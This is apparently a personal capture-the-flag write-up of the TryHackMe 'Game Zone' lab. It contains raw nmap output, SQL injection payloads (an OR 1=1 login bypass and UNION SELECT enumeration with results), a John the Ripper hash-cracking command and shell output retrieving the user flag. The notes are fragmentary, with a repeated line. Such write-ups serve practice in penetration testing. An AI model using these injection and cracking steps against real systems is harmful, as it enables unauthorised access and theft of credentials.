┌──(kali㉿kali)-[~/tryhackme/gamezone]
└─$ nmap -sV -sC -o nmap 10.10.59.114                                                         3 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-14 21:03 EDT
Nmap scan report for 10.10.59.114
Host is up (0.35s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.56 seconds

going on the webpage we note that it seems susceptible to standard sql injection
admin' OR 1=1 -- -

alternatively we can consider hydra bruteforce

__

entering into the portal, we can do error based sqli

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'' at line 1 

entering into the portal, we can do error based sqli

1' union select 1,2,3-- -
Title 	Review
2	3

1' union select 1,@@version,3-- -
Title 	Review
5.7.27-0ubuntu0.16.04.1	3

└─$ sudo john hash.txt --wordlist=/home/kali/Downloads/rockyou.txt --format=Raw-SHA256        1 ⨯



agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q Local Address:Port                Peer Address:Port              
udp    UNCONN     0      0                  *:10000                          *:*                  
udp    UNCONN     0      0                  *:68                             *:*                  
tcp    LISTEN     0      128                *:22                             *:*                  
tcp    LISTEN     0      80         127.0.0.1:3306                           *:*                  
tcp    LISTEN     0      128                *:10000                          *:*                  
tcp    LISTEN     0      128               :::22                            :::*                  
tcp    LISTEN     0      128               :::80                            :::* 